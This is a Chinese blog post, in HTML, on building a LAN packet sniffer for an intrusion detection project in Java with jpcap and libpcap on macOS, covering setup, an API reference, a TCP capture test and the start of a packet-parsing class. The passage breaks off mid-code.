<!DOCTYPE html><html lang="en" > <!-- The Head v2.0 https://github.com/cotes2020/jekyll-theme-chirpy © 2017-2019 Cotes Chung MIT License --><head><meta http-equiv="Content-Type" content="text/html; charset=UTF-8"><meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no"><title>局域网嗅探器与IDS | 银杏叶</title><meta name="generator" content="Jekyll v4.1.1" /><meta property="og:title" content="局域网嗅探器与IDS" /><meta name="author" content="Kol Huang" /><meta property="og:locale" content="en_US" /><meta name="description" content="基于jpcap的网络嗅探器。" /><meta property="og:description" content="基于jpcap的网络嗅探器。" /><link rel="canonical" href="www.yucaihuang.com/posts/simple-lan-sniffer/" /><meta property="og:url" content="www.yucaihuang.com/posts/simple-lan-sniffer/" /><meta property="og:site_name" content="银杏叶" /><meta property="og:type" content="article" /><meta property="article:published_time" content="2021-04-13T21:46:00+08:00" /><meta name="twitter:card" content="summary" /><meta property="twitter:title" content="局域网嗅探器与IDS" /><meta name="twitter:site" content="@twitter_username" /><meta name="twitter:creator" content="@Kol Huang" /><meta name="google-site-verification" content="google_meta_tag_verification" /> <script type="application/ld+json"> {"mainEntityOfPage":{"@type":"WebPage","@id":"www.yucaihuang.com/posts/simple-lan-sniffer/"},"url":"www.yucaihuang.com/posts/simple-lan-sniffer/","author":{"@type":"Person","name":"Kol Huang"},"description":"基于jpcap的网络嗅探器。","dateModified":"2021-04-13T21:46:00+08:00","datePublished":"2021-04-13T21:46:00+08:00","headline":"局域网嗅探器与IDS","@type":"BlogPosting","@context":"https://schema.org"}</script> <!-- The Favicons for Web, Android, Microsoft, and iOS (iPhone and iPad) Apps Generated by: https://www.favicon-generator.org/ v2.0 https://github.com/cotes2020/jekyll-theme-chirpy © 2019 Cotes Chung Published under the MIT license --><link rel="shortcut icon" href="/assets/img/favicons/favicon.ico" type="image/x-icon"><link rel="icon" href="/assets/img/favicons/favicon.ico" type="image/x-icon"><link rel="apple-touch-icon" href="/assets/img/favicons/apple-icon.png"><link rel="apple-touch-icon" href="/assets/img/favicons/apple-icon-precomposed.png"><link rel="apple-touch-icon" sizes="57x57" href="/assets/img/favicons/apple-icon-57x57.png"><link rel="apple-touch-icon" sizes="60x60" href="/assets/img/favicons/apple-icon-60x60.png"><link rel="apple-touch-icon" sizes="72x72" href="/assets/img/favicons/apple-icon-72x72.png"><link rel="apple-touch-icon" sizes="76x76" href="/assets/img/favicons/apple-icon-76x76.png"><link rel="apple-touch-icon" sizes="114x114" href="/assets/img/favicons/apple-icon-114x114.png"><link rel="apple-touch-icon" sizes="120x120" href="/assets/img/favicons/apple-icon-120x120.png"><link rel="apple-touch-icon" sizes="144x144" href="/assets/img/favicons/apple-icon-144x144.png"><link rel="apple-touch-icon" sizes="152x152" href="/assets/img/favicons/apple-icon-152x152.png"><link rel="apple-touch-icon" sizes="180x180" href="/assets/img/favicons/apple-icon-180x180.png"><link rel="icon" type="image/png" sizes="192x192" href="/assets/img/favicons/android-icon-192x192.png"><link rel="icon" type="image/png" sizes="32x32" href="/assets/img/favicons/favicon-32x32.png"><link rel="icon" type="image/png" sizes="96x96" href="/assets/img/favicons/favicon-96x96.png"><link rel="icon" type="image/png" sizes="16x16" href="/assets/img/favicons/favicon-16x16.png"><link rel="manifest" href="/assets/img/favicons/manifest.json"><meta name='msapplication-config' content='/assets/img/favicons/browserconfig.xml'><meta name="msapplication-TileColor" content="#ffffff"><meta name="msapplication-TileImage" content="/assets/img/favicons/ms-icon-144x144.png"><meta name="theme-color" content="#ffffff"><link rel="preconnect" href="https://fonts.gstatic.com" crossorigin="anonymous"><link rel="dns-prefetch" href="https://fonts.gstatic.com"><link rel="preconnect" href="https://www.google-analytics.com" crossorigin="use-credentials"><link rel="dns-prefetch" href="https://www.google-analytics.com"><link rel="preconnect" href="https://www.googletagmanager.com" crossorigin="anonymous"><link rel="dns-prefetch" href="https://www.googletagmanager.com"><link rel="preconnect" href="cdn.jsdelivr.net"><link rel="dns-prefetch" href="cdn.jsdelivr.net"><link rel="preload" as="style" href="https://cdn.jsdelivr.net/npm/bootstrap@4.0.0/dist/css/bootstrap.min.css" integrity="sha256-LA89z+k9fjgMKQ/kq4OO2Mrf8VltYml/VES+Rg0fh20=" crossorigin><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap@4.0.0/dist/css/bootstrap.min.css" integrity="sha256-LA89z+k9fjgMKQ/kq4OO2Mrf8VltYml/VES+Rg0fh20=" crossorigin="anonymous"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@5.11.2/css/all.min.css" integrity="sha256-+N4/V/SbAFiW1MPBCXnfnP9QSN3+Keu+NlB+0ev/YKQ=" crossorigin="anonymous"> <!-- CSS selector for site. Chirpy v2.3 https://github.com/cotes2020/jekyll-theme-chirpy © 2020 Cotes Chung MIT Licensed --><link rel="preload" as="style" href="/assets/css/post.css"><link rel="stylesheet" href="/assets/css/post.css"><link rel="preload" as="style" href="/assets/css/lib/bootstrap-toc.min.css"><link rel="stylesheet" href="/assets/css/lib/bootstrap-toc.min.css" /><link rel="preload" as="script" href="https://cdn.jsdelivr.net/npm/jquery@3.4.1" integrity="sha256-CSXorXvZcTkaix6Yvo6HppcZGetbYMGWSFlBw8HfCJo=" crossorigin="anonymous"> <script src="https://cdn.jsdelivr.net/npm/jquery@3.4.1" integrity="sha256-CSXorXvZcTkaix6Yvo6HppcZGetbYMGWSFlBw8HfCJo=" crossorigin="anonymous"></script> <script src="https://cdn.jsdelivr.net/combine/npm/popper.js@1.15.0,npm/bootstrap@4.0.0/dist/js/bootstrap.min.js" async></script> <script async src="https://www.googletagmanager.com/gtag/js?id=UA-176388509-1"></script> <script> window.dataLayer = window.dataLayer || []; function gtag(){dataLayer.push(arguments);} gtag('js', new Date()); gtag('config', 'UA-176388509-1'); </script> <!-- JS selector for site. Chirpy v2.3 https://github.com/cotes2020/jekyll-theme-chirpy © 2020 Cotes Chung MIT Licensed --> <script src="/assets/js/post.min.js" async></script> <script src="https://polyfill.io/v3/polyfill.min.js?features=es6"></script> <script src="https://cdn.jsdelivr.net/npm/mathjax@3/es5/tex-mml-chtml.js" async></script> <script src="/app.js" defer></script><body data-spy="scroll" data-target="#toc"><div id="sidebar" class="d-flex flex-column"> <!-- The Side Bar v2.0 https://github.com/cotes2020/jekyll-theme-chirpy © 2017-2019 Cotes Chung MIT License --><div id="nav-wrapper"><div id="profile-wrapper" class="d-flex flex-column"><div id="avatar" class="d-flex justify-content-center"> <a href="http://www.yucaihuang.com" alt="avatar"> <img src="/assets/img/daliy/avatar.jpg" alt="avatar" onerror="this.style.display='none'"> </a></div><div class="profile-text mt-3"><div class="site-title"> <a href="/">银杏叶</a></div><div class="site-subtitle font-italic">把开源的变成自己的，把自己的变成祖传的!</div></div></div><ul class="nav flex-column"><li class="nav-item d-flex justify-content-center "> <a href="/" class="nav-link d-flex justify-content-center align-items-center w-100"> <i class="fa-fw fas fa-home ml-xl-3 mr-xl-3 unloaded"></i> <span>HOME</span> </a></li><li class="nav-item d-flex justify-content-center "> <a href="/tabs/categories/" class="nav-link d-flex justify-content-center align-items-center w-100"> <i class="fa-fw fas fa-stream ml-xl-3 mr-xl-3 unloaded"></i> <span>CATEGORIES</span> </a></li><li class="nav-item d-flex justify-content-center "> <a href="/tabs/tags/" class="nav-link d-flex justify-content-center align-items-center w-100"> <i class="fa-fw fas fa-tags ml-xl-3 mr-xl-3 unloaded"></i> <span>TAGS</span> </a></li><li class="nav-item d-flex justify-content-center "> <a href="/tabs/archives/" class="nav-link d-flex justify-content-center align-items-center w-100"> <i class="fa-fw fas fa-archive ml-xl-3 mr-xl-3 unloaded"></i> <span>ARCHIVES</span> </a></li><li class="nav-item d-flex justify-content-center "> <a href="/tabs/about/" class="nav-link d-flex justify-content-center align-items-center w-100"> <i class="fa-fw fas fa-info ml-xl-3 mr-xl-3 unloaded"></i> <span>ABOUT</span> </a></li></ul></div><div class="sidebar-bottom d-flex flex-wrap justify-content-around mt-4"> <span id="mode-toggle-wrapper"> <!-- Switch the mode between dark and light. v2.1 https://github.com/cotes2020/jekyll-theme-chirpy © 2020 Cotes Chung MIT License --> <i class="mode-toggle fas fa-sun" dark-mode-invisible></i> <i class="mode-toggle fas fa-moon" light-mode-invisible></i> <script type="text/javascript"> class ModeToggle { static get MODE_KEY() { return "mode"; } static get DARK_MODE() { return "dark"; } static get LIGHT_MODE() { return "light"; } constructor() { if (this.mode != null) { if (this.mode == ModeToggle.DARK_MODE) { if (!this.isSysDarkPrefer) { this.setDark(); } } else { if (this.isSysDarkPrefer) { this.setLight(); } } } var self = this; /* always follow the system prefers */ this.sysDarkPrefers.addListener(function() { if (self.mode != null) { if (self.mode == ModeToggle.DARK_MODE) { if (!self.isSysDarkPrefer) { self.setDark(); } } else { if (self.isSysDarkPrefer) { self.setLight(); } } self.clearMode(); } }); } /* constructor() */ setDark() { $('html').attr(ModeToggle.MODE_KEY, ModeToggle.DARK_MODE); sessionStorage.setItem(ModeToggle.MODE_KEY, ModeToggle.DARK_MODE); } setLight() { $('html').attr(ModeToggle.MODE_KEY, ModeToggle.LIGHT_MODE); sessionStorage.setItem(ModeToggle.MODE_KEY, ModeToggle.LIGHT_MODE); } clearMode() { $('html').removeAttr(ModeToggle.MODE_KEY); sessionStorage.removeItem(ModeToggle.MODE_KEY); } get sysDarkPrefers() { return window.matchMedia("(prefers-color-scheme: dark)"); } get isSysDarkPrefer() { return this.sysDarkPrefers.matches; } get isDarkMode() { return this.mode == ModeToggle.DARK_MODE; } get isLightkMode() { return this.mode == ModeToggle.LIGHT_MODE; } get hasMode() { return this.mode != null; } get mode() { return sessionStorage.getItem(ModeToggle.MODE_KEY); } flipMode() { if (this.hasMode) { if (this.isSysDarkPrefer) { if (this.isLightkMode) { this.clearMode(); } else { this.setLight(); } } else { if (this.isDarkMode) { this.clearMode(); } else { this.setDark(); } } } else { if (this.isSysDarkPrefer) { this.setLight(); } else { this.setDark(); } } } /* flipMode() */ } /* ModeToggle */ let toggle = new ModeToggle(); $(".mode-toggle").click(function() { toggle.flipMode(); }); </script> </span> <span class="icon-border"></span> <a href="https://github.com/KolinHuang" target="_blank"> <i class="fab fa-github-alt"></i> </a> <a href="https://twitter.com/twitter_username" target="_blank"> <i class="fab fa-twitter"></i> </a> <a href=" javascript:window.open('mailto:' + ['yc_huang97','163.com'].join('@'))" > <i class="fas fa-envelope"></i> </a></div></div><!-- The Top Bar v2.0 https://github.com/cotes2020/jekyll-theme-chirpy © 2017-2019 Cotes Chung MIT License --><div id="topbar-wrapper" class="row justify-content-center topbar-down"><div id="topbar" class="col-11 d-flex h-100 align-items-center justify-content-between"> <span id="breadcrumb"> <span> <a href="/"> Posts </a> </span> <span>局域网嗅探器与IDS</span> </span> <i id="sidebar-trigger" class="fas fa-bars fa-fw"></i><div id="topbar-title"> Post</div><i id="search-trigger" class="fas fa-search fa-fw"></i> <span id="search-wrapper" class="align-items-center"> <i class="fas fa-search fa-fw"></i> <input class="form-control" id="search-input" type="search" placeholder="Search..."> <i class="fa fa-times-circle fa-fw" id="search-cleaner"></i> </span> <span id="search-cancel" >Cancel</span></div></div><div id="main-wrapper"><div id="main"> <!-- Refactor the HTML structure. --> <!-- Suroundding the markdown table with '<div class="table-wrapper">. and '</div>' --> <!-- Fixed kramdown code highlight rendering: https://github.com/penibelst/jekyll-compress-html/issues/101 https://github.com/penibelst/jekyll-compress-html/issues/71#issuecomment-188144901 --><div class="row"><div id="post-wrapper" class="col-12 col-lg-11 col-xl-8"><div class="post pl-1 pr-1 pl-sm-2 pr-sm-2 pl-md-4 pr-md-4"><h1 data-toc-skip>局域网嗅探器与IDS</h1><div class="post-meta text-muted d-flex flex-column"><div> Posted <!-- Date format snippet v2.4.1 https://github.com/cotes2020/jekyll-theme-chirpy © 2020 Cotes Chung MIT License --> <span class="timeago " data-toggle="tooltip" data-placement="bottom" title="Tue, Apr 13, 2021, 9:46 PM +0800" > Apr 13 <i class="unloaded">2021-04-13T21:46:00+08:00</i> </span> by <span class="author"> Kol Huang</div></div><div class="post-content"><p>基于jpcap的网络嗅探器。</p><p>对于Java开发者来说，java.net包里面提供的类和接口提供是TCP UDP两种网络协议的支持，也就是说基于JDK的网络编程都是在<strong>运输层</strong>之上的。如果要深入到网络层，就需要libpcap库的支持（在window系统中是winpcap）。由于libpcap是由C/C++实现的，所以需要一个中间件jpcap来实现转换，我们就可以直接在Java环境中调用jpcap提供的API实现上述需求。</p><h2 id="1-环境配置">1. 环境配置</h2><p>本人的实验环境:</p><ul><li>操作系统：Mac OS 10.15.7</li><li>Java版本：Oracle JDK 1.8</li></ul><p>首先到tcpdump的<a href="http://www.tcpdump.org">官网</a>上下载libpcap的latest release。</p><p><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-src="https://hyc-pic.oss-cn-hangzhou.aliyuncs.com/image-20210315194948294.png" alt="image-20210315194948294" style="zoom: 67%;" /></p><p>解压后cd到解压目录中，分别执行以下命令：</p><div class="language-shell highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
</pre><td class="rouge-code"><pre>./configure
make
make <span class="nb">install</span>
</pre></table></code></div></div><p>然后到<code class="language-plaintext highlighter-rouge">usr/local/lib</code>目录下就能找到名为<code class="language-plaintext highlighter-rouge">libpcap.dylib</code>文件，然后执行以下命令(MAC环境)将其绑定到Java的动态链接库：</p><div class="language-shell highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre><span class="nb">export </span><span class="nv">JAVA_LIBRARY_PATH</span><span class="o">=</span>usr/local/lib
</pre></table></code></div></div><p>libpcap库安装结束。接下来安装jpcap，首先到https://github.com/jpcap/jpcap 下载源码包，再按以下指示完成步骤：（摘录自https://sites.google.com/site/sipinspectorsite/download/jpcap）</p><ol><li>Both Java and libpcap are preinstalled on Mac OS X. If any of them is missing you should be able to install them from the Mac OS X install DVD.</li><li>Download and install <a href="http://developer.apple.com/tools/xcode/">Xcode</a>. The default installation of Xcode should provide you with the toolchain required for compiling Jpcap.</li><li>Download and extract Jpcap source build.</li><li>Go to <strong><em>‘</em></strong><strong>[Jpcap extracted directory]/src/c</strong>’ directory.</li><li>Run ‘<strong>make</strong>’.</li><li>Copy ‘<strong>libjpcap.jnilib</strong>’ to <strong>‘</strong><em>/Library/Java/Extensions/</em>’ directory.</li><li>Copy <em>‘<strong>[Jpcap extracted directory]/</strong></em><em><strong>lib/*jpcap.jar</strong>’ to ‘</em>/Library/Java/Extensions/<em>’ Or, place ‘</em>jpcap.jar*’ to any directory and include it to your CLASSPATH.</li></ol><p>如果执行第5步失败了，也可以直接将本项目<code class="language-plaintext highlighter-rouge">resources</code>目录下的<code class="language-plaintext highlighter-rouge">libjpcap.jnilib</code>文件（windows下是dll文件）复制到<code class="language-plaintext highlighter-rouge">/Library/Java/Extensions/</code>目录下，再将<code class="language-plaintext highlighter-rouge">jpcap.jar</code>包复制到<code class="language-plaintext highlighter-rouge">jre/lib/ext</code>目录下让扩展类加载器加载，或者放到自己设定的类路径下由系统类加载器加载。</p><p>测试环境：</p><div class="language-java highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
</pre><td class="rouge-code"><pre><span class="nc">NetworkInterface</span><span class="o">[]</span> <span class="n">devices</span> <span class="o">=</span> <span class="nc">JpcapCaptor</span><span class="o">.</span><span class="na">getDeviceList</span><span class="o">();</span>
<span class="nc">String</span><span class="o">[]</span> <span class="n">names</span> <span class="o">=</span> <span class="k">new</span> <span class="nc">String</span><span class="o">[</span><span class="n">devices</span><span class="o">.</span><span class="na">length</span><span class="o">];</span>
<span class="k">for</span> <span class="o">(</span><span class="kt">int</span> <span class="n">i</span> <span class="o">=</span> <span class="mi">0</span><span class="o">;</span> <span class="n">i</span> <span class="o">&lt;</span> <span class="n">names</span><span class="o">.</span><span class="na">length</span><span class="o">;</span> <span class="n">i</span><span class="o">++)</span> <span class="o">{</span>
	<span class="n">names</span><span class="o">[</span><span class="n">i</span><span class="o">]</span> <span class="o">=</span> <span class="o">(</span><span class="n">devices</span><span class="o">[</span><span class="n">i</span><span class="o">].</span><span class="na">description</span> <span class="o">==</span> <span class="kc">null</span> <span class="o">?</span> <span class="n">devices</span><span class="o">[</span><span class="n">i</span><span class="o">].</span><span class="na">name</span> <span class="o">:</span> <span class="n">devices</span><span class="o">[</span><span class="n">i</span><span class="o">].</span><span class="na">description</span><span class="o">);</span>
	<span class="nc">System</span><span class="o">.</span><span class="na">out</span><span class="o">.</span><span class="na">println</span><span class="o">(</span><span class="n">names</span><span class="o">[</span><span class="n">i</span><span class="o">]);</span>
<span class="o">}</span>
</pre></table></code></div></div><p>结果：打印出了所有网卡的名称：</p><div class="language-shell highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
</pre><td class="rouge-code"><pre>en0
p2p0
awdl0
llw0
utun0
utun1
utun2
utun3
lo0
bridge0
en1
en2
gif0
stf0
XHC0
XHC20
</pre></table></code></div></div><p>至此前期环境搭建完成。</p><h2 id="2-熟悉api">2. 熟悉API</h2><p>由于官方API比较难找，因此我从网络上收集了一些API介绍放到此处。JPCAP中比较重要的4个类：</p><h3 id="networkinterface">NetworkInterface</h3><p>该类的每一个实例代表一个网络设备，一般就是网卡。这个类只有一些数据成员，除了继承自java.lang.Object的基本方法以外，没有定义其它方法。</p><p>数据成员：</p><div class="table-wrapper"><table><thead><tr><th>返回值类型<th>名称<th>描述<tbody><tr><td>java.lang.String<td>datalink_description<td>数据链路层的描述。描述所在的局域网是什么网。例如，以太网（Ethernet）、无线LAN网（wireless LAN）、令牌环网(token ring)等等。<tr><td>java.lang.String<td>datalink_name<td>该网络设备所对应数据链路层的名称。具体来说，例如Ethernet10M、100M、1000M等等。<tr><td>java.lang.String<td>description<td>网卡是XXXX牌子XXXX型号之类的描述。<tr><td>boolean<td>Loopback<td>标志这个设备是否loopback设备。<tr><td>byte[]<td>mac_address<td>网卡的MAC地址，6个字节。<tr><td>java.lang.String<td>Name<td>这个设备的名称。例如我的网卡名称：\Device\NPF_{3CE5FDA5-E15D-4F87-B217-255BCB351CD5}<tr><td>jpcap.NetworkInterfaceAddress[]<td>addresses<td>设备IP地址（暂且这么理解）</table></div><h3 id="jpcapcaptor">JpcapCaptor</h3><p>该类提供了一系列静态方法来实现一些基本的功能。该类一个实例代表建立了一个与指定设备的链接，可以通过该类的实例来控制设备，例如设定网卡模式、设定过滤关键字等等。</p><p>数据成员：</p><div class="table-wrapper"><table><thead><tr><th>返回值类型<th>名称<th>描述<tbody><tr><td>int<td>dropped_packets<td>抛弃的包的数目。<tr><td>int<td>received_packets<td>收到的包的数目。</table></div><p>成员方法：</p><div class="table-wrapper"><table><thead><tr><th>返回值类型<th>方法名<th>描述<tbody><tr><td>staticNetworkInterface[]<td>getDeviceList()<td>返回一个网络设备列表。<tr><td>staticJpcapCaptor<td>openDevice(NetworkInterface interface, intsnaplen, booleanpromisc, intto_ms)<td>创建一个与指定设备的连接并返回该连接。注意，以上两个方法都是静态方法。<br /><br />Interface：要打开连接的设备的实例；<br /><br />Snaplen：这个是比较容易搞混的一个参数。其实这个参数不是限制只能捕捉多少数据包，而是限制每一次收到一个数据包，只提取该数据包中前多少字节；<br /><br />Promisc：设置是否混杂模式。处于混杂模式将接收所有数据包，若之后又调用了包过滤函数setFilter()将不起任何作用；<br /><br />To_ms：这个参数主要用于processPacket()方法，指定超时的时间；<tr><td>void<td>Close()<td>关闭调用该方法的设备的连接，相对于openDivece()打开连接。<tr><td>JpcapSender<td>getJpcapSenderInstance()<td>该返回一个JpcapSender实例，JpcapSender类是专门用于控制设备的发送数据包的功能的类。<tr><td>Packet<td>getPacket()<td>捕捉并返回一个数据包。这是JpcapCaptor实例中四种捕捉包的方法之一。<tr><td>int<td>loopPacket(intcount, PacketReceiver handler)<td>捕捉指定数目的数据包，并交由实现了PacketReceiver接口的类的实例处理，并返回捕捉到的数据包数目。如果count参数设为－1，那么无限循环地捕捉数据。<br /><br />这个方法不受超时的影响。还记得openDivice()中的to_ms参数么？那个参数对这个方法没有影响，如果没有捕捉到指定数目数据包，那么这个方法将一直阻塞等待。<br />PacketReceiver中只有一个抽象方法void receive(Packet p)。<tr><td>int<td>processPacket(intcount, PacketReceiver handler)<td>跟loopPacket()功能一样，唯一的区别是这个方法受超时的影响，超过指定时间自动返回捕捉到数据包的数目。<tr><td>int<td>dispatchPacket(intcount, PacketReceiverhandler)<td>跟processPacket()功能一样，区别是这个方法可以处于“non-blocking”模式工作，在这种模式下dispatchPacket()可能立即返回，即使没有捕捉到任何数据包。<tr><td>void<td>setFilter(java.lang.Stringcondition, booleanoptimize)<td>condition：设定要提取的包的关键字。<br /><br />Optimize：这个参数在说明文档以及源代码中都没有说明，只是说这个参数如果为真，那么过滤器将处于优化模式。<tr><td>void<td>setNonBlockingMode(booleannonblocking)<td>如果值为“true”，那么设定为“non-blocking”模式。<tr><td>void<td>breakLoop()<td>当调用processPacket()和loopPacket()后，再调用这个方法可以强制让processPacket()和loopPacket()停止。</table></div><h3 id="jpcapsender">JpcapSender</h3><p>该类专门用于控制数据包的发送。</p><p>成员方法：</p><div class="table-wrapper"><table><thead><tr><th>返回值类型<th>方法名<th>描述<tbody><tr><td>void<td>close()<td>强制关闭这个连接。<tr><td>staticJpcapSender<td>openRawSocket()<td>这个方法返回的JpcapSender实例发送数据包时将自动填写数据链路层头部分。<tr><td>void<td>sendPacket(Packet packet)<td>JpcapSender最重要的功能，发送数据包。需要注意的是，如果调用这个方法的实例是由JpcapCaptor的getJpcapSenderInstance()得到的话，需要自己设定数据链路层的头，而如果是由上面的openRawSocket()得到的话，那么无需也不能设置，数据链路层的头部将由系统自动生成。</table></div><h3 id="packet">Packet</h3><p>这个是所有其它数据包类的父类。Jpcap所支持的数据包有： ARPPacket、DatalinkPacket、EthernetPacket、ICMPPacket、IPPacket、TCPPacket、UDPPacket</p><h2 id="3抓包测试">3.抓包测试</h2><p>抓一个TCP包试试，编写Java程序：</p><p>开一个线程抓包：</p><div class="language-java highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
</pre><td class="rouge-code"><pre><span class="kd">private</span> <span class="kt">void</span> <span class="nf">startCaptureThread</span><span class="o">()</span> <span class="o">{</span>
  <span class="k">if</span> <span class="o">(</span><span class="n">captureThread</span> <span class="o">!=</span> <span class="kc">null</span><span class="o">)</span>
    <span class="k">return</span><span class="o">;</span>

  <span class="n">captureThread</span> <span class="o">=</span> <span class="k">new</span> <span class="nc">Thread</span><span class="o">(</span><span class="k">new</span> <span class="nc">Runnable</span><span class="o">()</span> <span class="o">{</span>
    <span class="kd">public</span> <span class="kt">void</span> <span class="nf">run</span><span class="o">()</span> <span class="o">{</span>
      <span class="k">while</span> <span class="o">(</span><span class="n">captureThread</span> <span class="o">!=</span> <span class="kc">null</span><span class="o">)</span> <span class="o">{</span>
        <span class="k">if</span> <span class="o">(</span><span class="n">jpcap</span><span class="o">.</span><span class="na">processPacket</span><span class="o">(</span><span class="mi">1</span><span class="o">,</span> <span class="n">handler</span><span class="o">)</span> <span class="o">==</span> <span class="mi">0</span> <span class="o">&amp;&amp;</span> <span class="o">!</span><span class="n">isLive</span><span class="o">)</span>
          <span class="n">stopCaptureThread</span><span class="o">();</span>
        <span class="nc">Thread</span><span class="o">.</span><span class="na">yield</span><span class="o">();</span>
      <span class="o">}</span>
      <span class="n">jpcap</span><span class="o">.</span><span class="na">breakLoop</span><span class="o">();</span>
    <span class="o">}</span>
  <span class="o">});</span>
  <span class="n">captureThread</span><span class="o">.</span><span class="na">setPriority</span><span class="o">(</span><span class="nc">Thread</span><span class="o">.</span><span class="na">MIN_PRIORITY</span><span class="o">);</span><span class="c1">//设置线程优先级</span>
  <span class="n">captureThread</span><span class="o">.</span><span class="na">start</span><span class="o">();</span>
<span class="o">}</span>
<span class="c1">//停止捕获数据包</span>
<span class="kd">public</span> <span class="kt">void</span> <span class="nf">stopCaptureThread</span><span class="o">()</span> <span class="o">{</span>
  <span class="n">captureThread</span> <span class="o">=</span> <span class="kc">null</span><span class="o">;</span>
<span class="o">}</span>
</pre></table></code></div></div><p>测试：</p><div class="language-java highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
</pre><td class="rouge-code"><pre><span class="nd">@Test</span>
<span class="kd">public</span> <span class="kt">void</span> <span class="nf">test</span><span class="o">()</span> <span class="kd">throws</span> <span class="nc">InterruptedException</span> <span class="o">{</span>
  <span class="nc">Captor</span> <span class="n">captor</span> <span class="o">=</span> <span class="k">new</span> <span class="nc">Captor</span><span class="o">();</span>
  <span class="c1">//        String[] devices = captor.showDevice();</span>
  <span class="n">captor</span><span class="o">.</span><span class="na">chooseDevice</span><span class="o">(</span><span class="mi">0</span><span class="o">);</span>
  <span class="n">captor</span><span class="o">.</span><span class="na">setFilter</span><span class="o">(</span><span class="s">"tcp"</span><span class="o">);</span><span class="c1">//设置提取关键字</span>
  <span class="n">captor</span><span class="o">.</span><span class="na">capturePackets</span><span class="o">();</span><span class="c1">//抓包</span>
  <span class="k">while</span><span class="o">(</span><span class="kc">true</span><span class="o">){</span>
    <span class="nc">System</span><span class="o">.</span><span class="na">out</span><span class="o">.</span><span class="na">println</span><span class="o">(</span><span class="s">"开始抓包"</span><span class="o">);</span>
    <span class="nc">Thread</span><span class="o">.</span><span class="na">sleep</span><span class="o">(</span><span class="mi">1000</span><span class="o">);</span>
    <span class="nc">List</span><span class="o">&lt;</span><span class="nc">Packet</span><span class="o">&gt;</span> <span class="n">packets</span> <span class="o">=</span> <span class="n">captor</span><span class="o">.</span><span class="na">getPackets</span><span class="o">();</span><span class="c1">//提取数据包</span>
    <span class="k">if</span><span class="o">(!</span><span class="n">packets</span><span class="o">.</span><span class="na">isEmpty</span><span class="o">()){</span>
      <span class="k">for</span> <span class="o">(</span><span class="nc">Packet</span> <span class="n">packet</span> <span class="o">:</span> <span class="n">packets</span><span class="o">)</span> <span class="o">{</span><span class="c1">//显示数据包内容</span>
        <span class="nc">System</span><span class="o">.</span><span class="na">out</span><span class="o">.</span><span class="na">println</span><span class="o">(</span><span class="n">captor</span><span class="o">.</span><span class="na">showPacket</span><span class="o">(</span><span class="n">packet</span><span class="o">));</span>
      <span class="o">}</span>
      <span class="k">break</span><span class="o">;</span>
    <span class="o">}</span>
  <span class="o">}</span>
  <span class="nc">System</span><span class="o">.</span><span class="na">out</span><span class="o">.</span><span class="na">println</span><span class="o">(</span><span class="s">"抓包结束"</span><span class="o">);</span>
<span class="o">}</span>
</pre></table></code></div></div><p>抓取成功，结果：</p><p><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-src="https://hyc-pic.oss-cn-hangzhou.aliyuncs.com/image-20210315211433345.png" alt="image-20210315211433345" /></p><h2 id="4解析数据包">4.解析数据包</h2><p>在第2节中介绍到：<code class="language-plaintext highlighter-rouge">Packet</code>是所有其它数据包类的父类。因此我们针对Packet编写一个抽象类<code class="language-plaintext highlighter-rouge">AbstractPacket</code>，规范一些各类数据包统一的操作。</p><div class="language-java highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
27
28
29
30
31
32
33
34
35
36
37
38
</pre><td class="rouge-code"><pre><span class="kn">package</span> <span class="nn">com.hyc.packet</span><span class="o">;</span>

<span class="kn">import</span> <span class="nn">com.hyc.metadata.Layer</span><span class="o">;</span>
<span class="kn">import</span> <span class="nn">jpcap.packet.Packet</span><span class="o">;</span>
<span class="kn">import</span> <span class="nn">java.util.List</span><span class="o">;</span>

<span class="cm">/**
 * @author kol Huang
 * @date 2021/3/12
 */</span>
<span class="kd">public</span> <span class="kd">abstract</span> <span class="kd">class</span> <span class="nc">AbstractPacket</span> <span class="o">{</span>

    <span class="c1">//数据包属于OSI模型的哪一层，默认为数据链路层。</span>
    <span class="kd">public</span> <span class="nc">Layer</span> <span class="n">layer</span> <span class="o">=</span> <span class="nc">Layer</span><span class="o">.</span><span class="na">DATALINK_LAYER</span><span class="o">;</span>
    <span class="c1">//协议名称</span>
    <span class="kd">private</span> <span class="nc">String</span> <span class="n">protocolName</span><span class="o">;</span>
    <span class="cm">/**
     * 抽象方法：验证数据包是否属于某个子类
     * @param packet
     * @return
     */</span>
    <span class="kd">public</span> <span class="kd">abstract</span> <span class="kt">boolean</span> <span class="nf">verify</span><span class="o">(</span><span class="nc">Packet</span> <span class="n">packet</span><span class="o">);</span>

    <span class="cm">/**
     * 抽象方法：对数据包进行解析
     * @param packet
     */</span>
    <span class="kd">public</span> <span class="kd">abstract</span> <span class="nc">List</span><span class="o">&lt;</span><span class="nc">String</span><span class="o">&gt;</span> <span class="nf">parse</span><span class="o">(</span><span class="nc">Packet</span> <span class="n">packet</span><span class="o">);</span>

    <span class="kd">public</span> <span class="nc">String</span> <span class="nf">getProtocolName</span><span class="o">()</span> <span class="o">{</span>
